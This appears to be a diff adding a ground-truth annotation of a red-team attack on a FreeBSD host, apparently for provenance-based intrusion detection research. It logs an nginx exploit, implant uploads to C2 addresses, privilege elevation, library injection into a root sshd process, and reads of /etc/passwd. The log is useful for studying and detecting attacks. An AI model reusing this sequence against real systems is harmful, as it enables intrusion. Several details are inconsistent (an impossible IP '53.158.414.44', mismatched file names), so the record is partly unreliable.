@@ -1,0 +1,104 @@
+date: "20180413"
+start_time: "09:04"
+end_time: "09:15"
+search_terms: 
+  - "reconnect"
+  - "whoami"
+  - "nc -s"
+  - "shell"
+  - "./deploy/archive/drakon.freebsd.x64_53.158.101.118"
+  - "pEja72mA"
+  - "./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119"
+  - "eWq10bVcx"
+  - "elevate"
+  - "20691"
+  - "/usr/sbin/sshd"
+  - "inject"
+  - "crash"
+  - "25.159.96.207"
+  - "128.55.12.73"
+  - "128.55.12.167"
+  - "76.56.184.25"
+  - "155.162.39.48"
+  - "98.115.236.119"
+  - "53.158.101.118"
+  - "memhelp.so"
+  - "eraseme"
+  - "done.so"
+  - "78.205.235.65"
+  - "nginx"
+  - "sshd"
+  - "/etc/group"
+  - "/etc/passwd"
+  - "/dec/gtx_dsa_675"
+
+#Second Attack of 3rd Track from Cadets Eng3
+
+# "Event Log:"
+    #  09:04 reconnect to open connection
+    #  09:04 whoami
+    #  09:06 quit
+    #  09:07 http post nc -s 25.159.96.207 128.55.12.73 80
+    #  09:07 shell F1
+    #  09:10 putfile ./deploy/archive/drakon.freebsd.x64_53.158.101.118 pEja72mA
+    #  09:11 putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 eWq10bVcx
+    #  09:12 elevate pEja72mA
+    #  09:12 connection F2
+    #  09:12 console F2
+    #  09:12 whoami
+    #  09:13 ps
+    #  * root 20691 0.0 0.0 17948 6088 - Ss 18:34  0:00.41 /usr/sbin/sshd
+    #  09:14 ps
+    #  09:15 inject
+    #  inject
+    #  inject
+    #  crash
+# "Adresses:" 
+    #  [eth0:920] 25.159.96.207:80 -> 128.55.12.167:8040 webserver 
+    #  [eth0:921] 76.56.184.25:80 -> 128.55.12.167:8041 shellcode_server
+    #  [eth0:922] 155.162.39.48:80 -> 128.55.12.167:8042 loaderDrakon.freebsd.x64
+    #  [eth0:923] 198.115.236.119:80 -> 128.55.12.167:8043  libdrakon.freebsd.x64
+    #  [eth0:924] 53.158.101.118:80 -> 128.55.12.167:8044 drakon.freebsd.x64
+# "Interactions:"
+#     "Files:"
+          #  F1>putfile ./deploy/archive/drakon.freebsd.x64_53.158.101.118 pEja72mA
+          #  F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 eWq10bVcx
+          #  F2>cp eWq10bVcx memhelp.so
+          #  F2>cp memhelp.so eraseme
+          #  F2>cp eraseme done.so
+#     "Processes:"
+          #  F1>elevate /tmp/pEja72mA
+          #  F2>inject /tmp/memhelp.so 20691
+          #  F2>inject eraseme 20691
+          #  F2>inject /tmp/done.so 20691
+#     "Connections:"
+          #  exploit: connection on port 80 from 25.159.96.207
+          #  nginx: connection to 78.205.235.65:80
+          #  nginx: connection to 155.162.39.48:80
+          #  pEja72mA: connection to 53.158.101.118:80
+          #  sshd: connection to 198.115.236.119:80
+# "Graph:"
+          # 25.159 96.267-80 connect exploit 80 nginx
+          # nginx read /etc/passwd
+          # nginx chmod /tmp/eWq10bVcx
+          # nginx write /tmp/eWq10bVcx
+          # nginx write 76.56.184.25:80
+          # nginx connect (oc2) 155.162.39.48:80
+          # nginx read /etc/group
+          # nging chmod /tmp/pEja72mA
+          # nginx execute (kern_execve) /tmp/pEja72mA
+          # nginx read /etc/passwd
+          # nginx write (cmd_exec, cache) /dec/gtx_dsa_675
+          # /dec/gtx_dsa_675 execute (kern_execve) /tmp/pEja72mA
+          # /tmp/pEja72mA new process (root) pEje72mA (PID 7)
+          # pEje72mA (PID 7) copy /tmp/eWq10bVcx 
+          # pEje72mA (PID 7) connect (oc2) 53.158.414.44:80
+          # pEje72mA (PID 7) copy /tmp/memhelp.so
+          # pEje72mA (PID 7) copy /tmp/eraseme
+          # pEje72mA (PID 7) write /tmp/memhelp.so
+          # pEje72mA (PID 7) write /tmp/eraseme
+          # pEje72mA (PID 7) write /tmp/done.so
+          # pEje72mA (PID 7) inject sshd (PID 20691) 
+          # pEje72mA (PID 7) read /etc/passwd
+          # sshd (PID 20691) connect 198.115.236.119:80
+
